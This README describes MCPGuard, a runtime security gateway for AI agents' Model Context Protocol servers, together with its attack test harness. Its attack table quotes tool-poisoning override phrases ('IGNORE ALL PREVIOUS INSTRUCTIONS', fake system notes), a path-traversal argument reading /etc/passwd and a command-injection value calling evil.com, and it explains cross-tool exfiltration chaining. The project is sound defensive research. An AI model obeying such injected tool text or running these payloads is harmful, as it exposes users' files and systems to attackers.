# MCPGuard

**Runtime security gateway for the Model Context Protocol.**

MCPGuard sits between an AI agent and its MCP servers, intercepting tool definitions before they reach the LLM context, enforcing declarative argument-level policy on every tool call, and writing a tamper-evident audit trail. It also ships a runtime attack framework — a payload library and test harness that fires real attack classes against a vulnerable MCP server — so that the defense can be proven, not just claimed.

> Built as a security research project at the intersection of agentic AI and applied AppSec.  
> Author: Sriya Katreddi · CMU INI MSIS '27 
---

## Why this exists

MCP has become the de facto connectivity standard for agentic AI — adopted by Anthropic, OpenAI, Google DeepMind, and Microsoft within months of its November 2024 release. As of mid-2026, over 17,000 MCP servers are indexed across public registries.

The protocol is, by design, a security-free zone. The [official MCP spec](https://modelcontextprotocol.io/specification/2025-11-25) explicitly states it cannot enforce security principles at the protocol level. That means every deployment ships without authentication, authorization, or audit capability unless the operator builds it themselves. Almost nobody does.

The consequences are measurable:

- **40.55%** of remote MCP servers expose tool interfaces with no authentication (arxiv, May 2026)
- **12,520** internet-accessible MCP services found by Censys, most unauthenticated
- **82%** of MCP implementations use file operations prone to path traversal (Endor Labs, 2026)
- **67%** use APIs susceptible to command injection
- The SmartLoader campaign (Feb 2026) delivered a StealC infostealer via a trojanized MCP server submitted to a legitimate registry

The core vulnerability is architectural. In a traditional API, documentation is passive — it describes what a server does but cannot cause actions. In MCP, an LLM reads tool descriptions and autonomously decides what to call based on what it reads. **The description is no longer documentation. It is input to a system that takes real actions.** Malicious instructions embedded in tool descriptions execute silently, on every invocation, across every session, for every user — persistent infrastructure compromise rather than a one-time phishing attack.

Existing tools address the static layer: they scan tool descriptions for known-bad patterns at install time. MCPGuard addresses the runtime layer — the only point where rug-pull attacks (servers that change their descriptions after gaining trust) can be detected, and where argument-level authorization violations can be enforced.

---

## Demo

*Recording in progress — will show: attack fires → exfiltration confirmed → gateway enabled → attack blocked → report generated*

```
$ mcpguard run --target vulnerable_server --policy policy.yaml

[mcpguard] session started · 5 attacks queued

  → tool_poisoning/naive_override      BLOCKED   ASI01  tools/list intercepted
  → tool_poisoning/steganographic      BLOCKED   ASI01  authority framing detected
  → tool_poisoning/param_encoding      BLOCKED   ASI01  parameter name pattern match
  → injection/path_traversal           BLOCKED   ASI02  path constraint violation: ../
  → injection/command_injection        BLOCKED   ASI02  shell metacharacter in cmd arg

[mcpguard] 5/5 attacks blocked · 0 silent bypasses · audit log: ./mcpguard_audit.jsonl
[mcpguard] report written: ./mcpguard_report.md
```

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        MCPGuard                                 │
│                                                                 │
│  ┌──────────┐    tools/list    ┌─────────────────────────────┐  │
│  │          │ ───────────────► │  Pre-context inspector      │  │
│  │  Agent   │                  │  · poisoning pattern scan   │  │
│  │  (LLM)   │                  │  · schema diff / rug-pull   │  │
│  │          │ ◄─────────────── │    detection                │  │
│  │          │   clean or       └─────────────────────────────┘  │
│  │          │   blocked                     │                   │
│  │          │                               ▼                   │
│  │          │    tools/call    ┌─────────────────────────────┐  │
│  │          │ ───────────────► │  Policy engine              │  │
│  │          │                  │  · tool-level allow/deny    │  │
│  │          │                  │  · argument-level checks    │  │
│  │          │                  │  · tenant scoping (v3)      │  │
│  │          │ ◄─────────────── └─────────────────────────────┘  │
│  └──────────┘   result or               │                       │
│                 deny + reason           ▼                       │
│                                ┌─────────────────────────────┐  │
│                                │  Audit log                  │  │
│                                │  · append-only JSONL        │  │
│                                │  · hash-chained entries     │  │
│                                │  · tamper-evident           │  │
│                                └─────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
         │                                        │
         ▼                                        ▼
  ┌─────────────┐                        ┌──────────────┐
  │  MCP server │                        │  Attack      │
  │  (any)      │                        │  framework   │
  │             │                        │  (offensive  │
  │  GitHub     │                        │   module)    │
  │  Filesystem │                        └──────────────┘
  │  Slack      │
  │  Database   │
  └─────────────┘
```

MCPGuard is MCP-server-agnostic. It proxies the MCP protocol on both sides — presenting as a server to the agent and as a client to the upstream server — requiring no changes to either. Pointing an agent at MCPGuard instead of directly at an MCP server is a one-line config change.

---

## What it defends against

Every attack class maps to the [OWASP Agentic AI Top 10](https://owasp.org/www-project-top-10-for-large-language-model-applications/) (2026).

| Attack class | Mechanism | OWASP category | MCPGuard defense |
|---|---|---|---|
| Tool poisoning — naive override | `[IGNORE ALL PREVIOUS INSTRUCTIONS]` in description | ASI01 | Pre-context inspector, regex pattern |
| Tool poisoning — steganographic embed | Authority framing: `[SYSTEM NOTE: compliance requires...]` | ASI01 | Pre-context inspector, framing patterns |
| Tool poisoning — parameter name encoding | Instruction hidden in parameter name field | ASI01 | Pre-context inspector, all fields scanned |
| Tool poisoning — rug-pull | Description changes after N sessions | ASI01 | Schema diff on every tools/list call |
| Path traversal | `read_file(path="../../../etc/passwd")` | ASI02 | Argument-level policy, path prefix constraint |
| Command injection | `run_shell(cmd="ls; curl evil.com")` | ASI02 | Argument-level policy, shell metachar blocklist |
| Cross-tenant BOLA | `query(tenant_id="B")` when scoped to tenant A | ASI03 | Argument-level policy, tenant binding |
| Over-permissioned agent | Static service account with admin scope | ASI03 | Scoped identity tokens (v3) |
| Supply chain — typosquatting | Near-identical server name in registry | ASI04 | Scanner module (see roadmap) |
| Cross-tool chaining | Payload in tool A triggers exfil via tool B | ASI01 | Partial — documented bypass, see below |

### Known partial bypass

Cross-tool chaining — where an attacker's payload in tool A causes the agent to invoke tool B for exfiltration — partially evades per-tool policy because the authorization decision on tool B's call is evaluated in isolation, without awareness of what caused it. This is the open research problem that motivates the session state graph (see roadmap). The bypass is documented honestly here because a 100% block rate against a constrained test suite is less credible than an honest finding with a named gap.

---

## Project structure

```
mcpguard/
├── attack/
│   ├── vulnerable_server.py     # intentionally insecure MCP server (test target)
│   ├── payloads/
│   │   ├── naive_override.py
│   │   ├── steganographic_embed.py
│   │   ├── param_name_encoding.py
│   │   ├── path_traversal.py
│   │   └── command_injection.py
│   ├── test_harness.py          # fires payloads against a live agent+server setup
│   └── result_classifier.py    # determines exploit confirmed / blocked / error
│
├── gateway/
│   ├── proxy.py                 # MCP server (agent-facing) + client (upstream-facing)
│   ├── inspector/
│   │   ├── poisoning_detector.py
│   │   └── schema_diff.py
│   ├── policy/
│   │   ├── engine.py
│   │   └── policy.yaml          # declarative allow/deny rules
│   └── audit/
│       └── log.py               # append-only, hash-chained JSONL
│
├── report/
│   └── generator.py             # attack-vs-gateway report (markdown + HTML)
│
├── tests/
│   └── test_*.py
│
├── mcpguard.py                  # CLI entry point
└── README.md
```

---

## Quickstart

```bash
# clone and install
git clone https://github.com/sriyavelagapudi/mcpguard
cd mcpguard
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"

# run the full attack + defense loop
mcpguard run --policy gateway/policy/policy.yaml

# run gateway only (proxy mode, no attacks)
mcpguard proxy --upstream stdio://path/to/real_mcp_server --policy gateway/policy/policy.yaml

# view audit log
mcpguard audit --log mcpguard_audit.jsonl
```

---

## Policy file

Policies are declarative YAML. The gateway evaluates every tool call against the active policy before forwarding.

```yaml
# policy.yaml
version: "1.0"

tools:
  read_file:
    allow: true
    constraints:
      path:
        must_start_with: ["/home/user/projects", "/tmp/mcpguard"]
        must_not_contain: ["..", "~", "/etc", "/root"]

  run_shell:
    allow: false
    reason: "shell execution disabled by policy"

  send_data:
    allow: true
    constraints:
      destination:
        allowlist: ["localhost", "internal.company.com"]

default: deny
```

---

## Research context

MCPGuard is designed as a research artifact as much as a tool. Each module maps to an open research question.

### Research questions

**RQ1 — Enterprise defense (core thesis)**  
*What policy expressiveness and session state is required to block all OWASP MCP Top 10 attack classes without breaking legitimate tool use, and what is the precision/recall of a pre-context interception approach?*

This is the primary question the current implementation answers. The attack framework provides the evaluation methodology: N attack classes fired, M blocked, precision/recall of the detection engine across payload variants.

**RQ2 — Offensive security**  
*What attack primitives are unique to the MCP protocol that do not appear in existing web/API vulnerability taxonomies — and how are they exploited at runtime rather than at static analysis time?*

The rug-pull variant and cross-tool chaining are the two novel primitives. Neither appears in traditional OWASP web application categories. The attack framework documents their mechanics and exploitation conditions.

**RQ3 — Internet measurement (future work)**  
*What fraction of publicly reachable MCP servers have no authentication, serve potentially poisoned tool descriptions, or expose high-blast-radius tools (code execution, database query, filesystem write) — and how does this change over time?*

Existing measurement work (arxiv, May 2026) covers authentication presence/absence. The tool-level exposure, description semantic analysis, and longitudinal rug-pull detection are unmeasured. This question is the basis for a planned collaboration with [RANDLab at UC Santa Cruz](https://randlab.cs.ucsc.edu).

**RQ4 — Ecosystem security (future work)**  
*How do supply chain attacks propagate through MCP package registries, and what signals reliably distinguish malicious from legitimate server packages?*

The SmartLoader campaign (Feb 2026) demonstrated that attackers build fake contributor ecosystems to establish trust before delivering payloads. Adapting the StarScout methodology (CMU ICSE 2026) from fake stars to fake contributors in MCP registries is an open measurement problem.

### Connection to existing work

| Work | How MCPGuard relates |
|---|---|
| OWASP Agentic AI Top 10 (2026) | Full ASI category mapping — MCPGuard is an implementation of the recommended gateway control |
| NIST CAISI / IETF AIMS (2026) | v3 scoped identity tokens implement the WIMSE WIT pattern from the IETF AIMS draft |
| StarScout — CMU ICSE 2026 | Methodology baseline for RQ4 fake contributor detection |
| MCP authentication measurement — arxiv May 2026 | First measurement paper; RQ3 extends it to tool-level exposure and longitudinal analysis |
| CyberArk "Poison Everywhere" (2025) | Confirms parameter-name encoding attack class implemented in the payload library |

---

## Build roadmap

### v1.0 — MVP (target: August 2026)
- [x] Vulnerable test server
- [x] 5-class payload library with verify_success()
- [x] Pre-context tools/list interceptor
- [x] Schema diff / rug-pull detection
- [x] YAML declarative policy (tool + argument level)
- [x] Hash-chained audit log
- [x] Attack-vs-gateway report generator
- [x] CLI entry point

### v2.0 — Depth (CMU semester 1, fall 2026)
- [ ] Semantic intent classifier: lightweight LLM-as-judge on tool call argument intent
- [ ] Session state graph: detect toxic agent flows — cross-tool chaining via session context
- [ ] 7 additional attack classes: response injection, privilege drift, cross-tool chaining (full), NeighborJack
- [ ] Integration tests against real MCP servers: GitHub MCP, filesystem MCP, Slack MCP

### v3.0 — Identity + measurement (CMU semester 2, spring 2027)
- [ ] Scoped identity tokens: SPIFFE-style per-agent JWTs bound to policy
- [ ] Supply chain scanner: typosquat detection, fake contributor signals, registry trust scoring
- [ ] Longitudinal measurement study: weekly re-scan of public MCP registry corpus

---

## Responsible use

The attack framework targets a local, intentionally vulnerable MCP server. **Do not run the attack module against any server you do not own or have explicit written permission to test.** This is standard security research practice — the same constraint applies to Metasploit, Burp Suite, and any other offensive security tool.

If you discover a real vulnerability in a production MCP server while using MCPGuard's scanner functionality, follow coordinated disclosure: notify the operator privately, allow a 90-day remediation window, then disclose publicly. See [SECURITY.md](SECURITY.md) for the full disclosure policy.

---

## Acknowledgments

Built during a security engineering internship at [Labelbox](https://labelbox.com), where an internal proof-of-concept of the gateway was deployed against production MCP infrastructure.

Research direction informed by conversations at RSAC 2026 College Day (Moscone Center) and by the work of the OWASP AI Security Working Group, NIST CAISI, and the IETF WIMSE working group.

---

## License

MIT. See [LICENSE](LICENSE).

---

*If you're working on agentic AI security and want to collaborate — on the measurement study, the session state graph, or anything else in the roadmap — reach out.*
